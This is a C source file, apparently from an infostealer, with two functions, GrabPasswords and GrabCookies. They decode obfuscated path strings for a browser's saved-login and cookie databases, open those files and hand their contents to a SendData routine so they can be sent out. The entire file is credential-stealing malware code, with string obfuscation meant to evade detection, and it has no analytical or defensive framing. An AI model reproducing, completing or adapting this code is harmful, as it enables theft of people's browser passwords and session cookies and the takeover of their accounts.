#include "../include/BrowserGrabber.h"
#include "../include/MemoryUtils.h"
#include "../include/StringUtils.h"
#include "../include/SendData.h"
#include "../include/PathOps.h"
#include "../include/FileIO.h"
#include "../include/decoding.h"


void GrabPasswords(unsigned short *BrowserPath) {
    HANDLE              FileHandle          = {0};
    UNICODE_STRING      PathUnicode         = {0};
    OBJECT_ATTRIBUTES   PathObj             = {0};
    char                FileSizeString[20]  = {0};
    unsigned char      *buffer              = {0};
    unsigned short      TempPath[250]       = {0};
    unsigned short      LoginDataPath[20]   = {0x0061, 0x009b, 0x0078, 0x00b8, 0x0075, 0x00c2, 0x0094, 0x00b8, 0x008c, 0x0078, 0x008f, 0x00b6, 0x0081, 0x00bf, 0x003d, 0x0047, 0x00a2, 0x0094, 0x00b5, 0x0000};
    int                 FileSize            = 0;
    int                 FullBufferSize      = 0;
    int                 PathSize            = lenW(BrowserPath);

    DecodeStringW(LoginDataPath);
    /*length * 2 because its wide character string*/
    MovMemory(BrowserPath, TempPath, PathSize * 2);
    ConcatStringW(TempPath, LoginDataPath, PathSize);

    InitPathObj(TempPath, &PathObj, &PathUnicode);
    if (OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN) != 0) {
        return;
    }

    FileSize = GetFileSizeY(FileHandle);
    FullBufferSize = TotalBufferLength(L"ONE", FileSize);
    
    buffer = AllocMemory(FullBufferSize);
    if (buffer == NULL) {
        return 1;
    }

    IntToString(FileSizeString, FileSize);

    SendData(FileHandle, "ONE", FileSize, FileSizeString, buffer, NULL, TRUE);
}

void GrabCookies(unsigned short *BrowserPath) {
    UNICODE_STRING      PathUnicode         = {0};
    OBJECT_ATTRIBUTES   PathObj             = {0};
    HANDLE              FileHandle          = {0};
    char                FileSizeString[20]  = {0};
    unsigned char      *buffer              = {0};
    unsigned short      TempPath[250]       = {0};
    unsigned short      CookiesPath[25]     = {0x0061, 0x009b, 0x0078, 0x00b8, 0x0075, 0x00c2, 0x0094, 0x00b8, 0x008c, 0x007a, 0x0087, 0x00b7, 0x00a8, 0x00b5, 0x009b, 0x00b4, 0x007e, 0x007d, 0x0078, 0x00d5, 0x0074, 0x00cb, 0x006c, 0x00d1, 0x0000};
    int                 FileSize            = 0;
    int                 FullBufferSize      = 0;
    int                 PathSize            = lenW(BrowserPath);

    DecodeStringW(CookiesPath);
    /*length * 2 because its wide character string*/
    MovMemory(BrowserPath, TempPath, PathSize * 2);
    ConcatStringW(TempPath, CookiesPath, PathSize);

    InitPathObj(TempPath, &PathObj, &PathUnicode);
    if (OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN) != 0) {
        return;
    }

    FileSize = GetFileSizeY(FileHandle);
    FullBufferSize = TotalBufferLength(L"TWO", FileSize);

    buffer = AllocMemory((SIZE_T)FullBufferSize);
    if (buffer == NULL) {
        return;
    }

    IntToString(FileSizeString, FileSize);

    SendData(FileHandle, "TWO", FileSize, FileSizeString, buffer, NULL, TRUE);
}